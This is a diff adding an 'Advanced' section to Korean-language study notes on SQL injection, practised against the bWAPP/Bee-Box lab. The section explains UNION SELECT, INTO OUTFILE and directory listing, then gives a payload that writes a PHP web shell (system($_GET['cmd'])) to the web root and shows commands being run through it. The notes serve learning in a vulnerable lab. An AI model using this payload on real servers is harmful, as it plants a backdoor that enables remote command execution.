@@ -61,7 +61,7 @@ UNION은,
 
 내 방식대로 표현하자면,
 
-"SELECT의 결과"를 밑변을 기준으로 합치는 것이다.
+<u>"SELECT의 결과"를 밑변을 기준으로 합치는 것</u>이다.
 
 <br>
 
@@ -269,4 +269,80 @@ mysql_real_escape_string() 함수는 `\n, \r, \x1a` 를 추가로 escape 한다.
 
 ## Advanced
 
-이번 섹션에서 접한 초 재밌는 부분이다.
+이번 섹션에서 접한 Super 재밌는 내용이다. 응용할 내용은 다음 2가지이다.
+
+- SELECT, OUTFILE
+- Directory Listing
+
+<br><br>
+
+위의 UNION 실험에서 잠깐 나왔는데 SELECT 만 사용할 경우 결과를 그대로 반환한다.
+
+이것을 응용하면
+
+![WindowsTerminal_EkOTaUcDPm](https://user-images.githubusercontent.com/79683414/135023018-23c40c7e-8c36-45fd-b1a3-eb9b93393e96.png)
+
+<br><br>
+
+위와 같이 문자열을 그대로 반환한다.
+
+위의 php 코드는 GET 파라매터의 cmd 변수의 값을 가져와 system() 함수로 실행시키는 내용이다.
+
+<br><br>
+
+"OUTFILE"의 경우 Query의 결과를 파일로 저장하는 명령어이다.
+
+MySQL 의 `secure_file_priv` 옵션이 활성화된 경우, 해당 옵션에 지정된 경로에만 파일 생성이 가능하다.
+
+현재 테스트 중인 DB의 `secure_file_priv` 옵션의 디폴트 값은 "/var/lib/mysql-files/" 이다.
+
+![explorer_JT6CCOPSCV](https://user-images.githubusercontent.com/79683414/135024401-714f0cc0-2563-41a5-9072-89e26aed2d62.png)
+
+<br>
+
+Bee-Box에서 확인해본 결과 `secure_file_priv` 옵션이 비활성화 되어있어,
+
+"OUTFILE"을 이용하여 원하는 경로에 파일을 생설할 수 있다.
+
+<br><br>
+
+Directory Listing 취약점은 URL에 특정 Directory를 입력했을 때(Directory이므로 `\` 로 끝난다.),
+
+해당 경로의 모든 파일이 Listing 되는 취약점이다.
+
+이 취약점이 발생했을 때 아래와 같이 상단에 "Index of ~~" 문자열이 출력된다. 
+
+![WindowsTerminal_yAhitvN0Xf](https://user-images.githubusercontent.com/79683414/135023657-e3d9e22b-7f30-444b-9309-057382e2a95c.png)
+
+<br><br>
+
+위의 개념들을 이용해서 Injection 해보자.
+
+"/bWAPP/images/"에 "sqli.php" 파일을 생성할 것이다.
+
+`0' union select 1, "<?php system($_GET['cmd']) ?>",3,4,5,6,7 into outfile "/var/www/bWAPP/images/sqli.php" # `
+
+![chrome_q29EndecYo](https://user-images.githubusercontent.com/79683414/135026604-59705f5f-db6e-404c-bc6a-d13ee3236fda.png)
+
+<br><br>
+
+Warning 이 뜨면서 Injection이 성공적으로 수행된 것을 보면
+
+Bee-Box 의 DB에 `--secure-file-priv` 옵션이 비활성화 되어있는 듯 하다.
+
+Directory listing 을 이용해 "sqli.php"파일이 생성되어있는지 확인해보자.
+
+![chrome_YtcrfvD5vF](https://user-images.githubusercontent.com/79683414/135026920-87a0cff7-87cd-41fb-b170-a8cab379f186.png)
+
+<br>
+
+<br>
+
+성공!!
+
+이제 GET 방식을 이용해 "cmd" 변수에 원하는 명령을 입력해주면 된다.
+
+![chrome_mFeFkvVlSI](https://user-images.githubusercontent.com/79683414/135027174-5bdc9301-a3de-45c9-b78f-0611a0b5da0a.png)
+![chrome_Q6B7FHMfpr](https://user-images.githubusercontent.com/79683414/135027176-9240c59f-98b3-43f1-85dc-898f0bd98a48.png)
+![chrome_jx7I1iojLx](https://user-images.githubusercontent.com/79683414/135027182-429bb594-94a9-4a68-8c54-39c1c1a44389.png)
+
